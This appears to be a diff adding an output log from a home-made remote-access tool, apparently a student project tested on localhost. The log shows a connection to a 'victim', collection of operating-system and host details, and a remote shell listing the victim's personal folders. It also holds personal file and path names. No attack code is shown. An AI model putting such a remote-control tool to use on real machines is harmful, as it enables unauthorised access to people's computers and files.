@@ -1,0 +1,62 @@
+###          FILELOG RESULT          ###
+
+[CONNECTED] Established a connection with the Victim; Socket: ('127.0.0.1', 50204) is connected to the server
+
+
+Information on the victim's Operating System ('127.0.0.1', 50204):
+
+Operating System: Windows
+Machine: AMD64
+Host: LAPTOP-JKLTQPAK
+Processor: Intel64 Family 6 Model 165 Stepping 2, GenuineIntel
+Platform: Windows-10-10.0.22000-SP0
+Release: 10
+Path: C:\Users\biagi\Desktop\Desktop\PythonProject
+
+
+[DONE] Info received.
+
+
+[REMOTE CONTROL] Procedure activated; you are now on the victim's pc in the path below...
+
+C:\Users\biagi\Desktop\Desktop\PythonProject$ ls 
+
+An error occurred, try again...
+
+C:\Users\biagi\Desktop\Desktop\PythonProject$ ls
+
+-: .idea
+-: cronologiaGoogle.py
+-: desktop.ini
+-: Parking
+-: Progetto Reti
+-: venv
+-: virusFile.py
+-: WebSOCKET
+-: Wireshark.lnk
+
+
+C:\Users\biagi\Desktop\Desktop\PythonProject$ cd ..
+
+C:\Users\biagi\Desktop\Desktop$ ls
+
+-: 1° Semestre Terzo Anno.xlsx
+-: 23_12_2022 11_36_58.png
+-: Android Studio
+-: block.png
+-: Cestino - collegamento.lnk
+-: desktop.ini
+-: Desktop.png
+-: Documenti.lnk
+-: Dove si trovano i miei file.lnk
+-: Lista Movimenti.xlsx
+-: Napoli
+-: OneDriveUni.lnk
+-: PDF Da stampare
+-: PERSONALE
+-: Progetti.docx
+-: PythonProject
+-: sky.lnk
+-: Udemy.lnk
+-: Università
+
